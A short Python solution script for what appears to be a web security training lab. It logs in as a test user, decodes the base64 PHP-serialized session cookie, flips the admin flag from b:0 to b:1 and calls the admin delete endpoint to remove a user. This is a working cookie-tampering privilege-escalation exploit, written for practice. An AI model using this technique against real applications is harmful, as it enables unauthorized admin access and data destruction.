import sys
import os
import base64
from urllib.parse import unquote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

# the session cookie is a base64-encoded PHP serialized object
# decode it, flip the admin attribute from b:0 to b:1, re-encode
cookie = lab.session.cookies.get("session")
lab.info(f"Original cookie: {cookie}")

raw = base64.b64decode(unquote(cookie)).decode()
lab.info(f"Deserialized: {raw}")

# change admin boolean from 0 (false) to 1 (true)
modified = raw.replace("b:0;", "b:1;")
lab.info(f"Modified: {modified}")

# re-encode and set the cookie
new_cookie = base64.b64encode(modified.encode()).decode()
lab.session.cookies.set("session", new_cookie)

# access admin panel and delete carlos
resp = lab.get("/admin/delete?username=carlos")

lab.check_solved()
